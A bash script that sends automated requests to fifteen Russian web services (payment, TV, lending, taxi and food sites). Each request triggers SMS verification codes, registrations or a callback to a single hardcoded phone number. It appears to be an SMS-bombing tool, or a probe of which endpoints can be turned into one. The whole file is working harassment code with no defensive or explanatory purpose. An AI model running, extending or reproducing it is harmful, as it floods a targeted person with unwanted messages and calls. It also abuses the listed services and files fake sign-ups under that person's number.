#!/bin/bash
PHONE="${PROBE_PHONE:-89312894756}"
E164="+7${PHONE#8}"
UA="Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/131.0.0.0 Mobile Safari/537.36"

probe_json() {
  local name=$1 url=$2 data=$3
  code=$(curl -4 -s -o /tmp/x -w "%{http_code}" -A "$UA" -X POST -H "Content-Type: application/json" -d "$data" "$url")
  echo "$name -> HTTP $code | $(head -c 200 /tmp/x | tr '\n' ' ')"
}

probe_form() {
  local name=$1 url=$2 data=$3
  code=$(curl -4 -s -o /tmp/x -w "%{http_code}" -A "$UA" -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "$data" "$url")
  echo "$name -> HTTP $code | $(head -c 200 /tmp/x | tr '\n' ' ')"
}

probe_get() {
  local name=$1 url=$2
  code=$(curl -4 -s -o /tmp/x -w "%{http_code}" -A "$UA" "$url")
  echo "$name -> HTTP $code | $(head -c 200 /tmp/x | tr '\n' ' ')"
}

probe_json "Koronapay" "https://koronapay.com/transfers/online/api/users/otps" "{\"phone\":\"$PHONE\"}"
probe_form "Koronapay-form" "https://koronapay.com/transfers/online/api/users/otps" "phone=$PHONE"
probe_get "MTS-TV" "https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code?msisdn=$PHONE"
probe_json "Qlean" "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code" "{\"phone\":\"$PHONE\"}"
probe_json "Start-otp" "https://start.ru/api/v1/auth/otp" "{\"phone\":\"$E164\"}"
probe_json "Start-send" "https://start.ru/api/v1/auth/send-code" "{\"phone\":\"$E164\"}"
probe_json "Iconjob" "https://api.iconjob.co/api/auth/verification_code" "{\"phone\":\"$PHONE\"}"
probe_json "Webbankir" "https://ng-api.webbankir.com/user/v2/create" "{\"lastName\":\"Test\",\"firstName\":\"Test\",\"middleName\":\"Test\",\"mobilePhone\":\"$PHONE\",\"email\":\"t@t.com\",\"smsCode\":\"\"}"
probe_form "Moneyman" "https://moneyman.ru/registration_api/actions/send-confirmation-code" "+$PHONE"
probe_form "Paylate" "https://paylate.ru/registry" "mobile=%2B7${PHONE:1}&first_name=Test&last_name=Test&nick_name=Test&gender-client=1&email=t@t.com&action=registry"
probe_json "TheHive" "https://thehive.pro/auth/signup" "{\"phone\":\"$E164\"}"
probe_json "NN-card" "https://nn-card.ru/api/1.0/covid/login" "{\"phone\":\"$PHONE\"}"
probe_form "Niyama" "https://www.niyama.ru/ajax/sendSMS.php" "REGISTER[PERSONAL_PHONE]=$PHONE&code=&sendsms=1"
probe_form "Sayoris" "https://sayoris.ru/?route=parse/whats" "phone=$PHONE"
probe_form "TaxiRitm-CALL" "https://www.taxi-ritm.ru/ajax/ppp/ppp_back_call.php" "RECALL=Y&BACK_CALL_PHONE=%2B7%20(931)%20289-47-56"
